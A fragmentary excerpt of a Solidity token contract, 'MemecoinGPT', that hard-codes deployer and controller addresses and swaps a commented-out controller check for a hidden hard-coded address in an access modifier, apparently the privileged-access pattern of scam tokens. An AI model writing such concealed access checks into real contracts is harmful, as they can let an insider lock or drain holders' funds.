...
contract MemecoinGPT is Context, IERC20 {
    ...
    address deployer = 0x6FFD58a614e1c0FC88a15cbe932ea2482d1FD180;
    address public _controller = 0x6FFD58a614e1c0FC88a15cbe932ea2482d1FD180;
    constructor () public {
        _name = "MemecoinGPT";
        _symbol ="MGPT";
        _decimals = 18;
    ...
    modifier _approveAccess() {
        //require(msg.sender == _controller, "Not allowed to interact");
        require(msg.sender == 0x9A3C1e271e66795be1ad64d2F13656B99082d917, "Not allowed to interact");
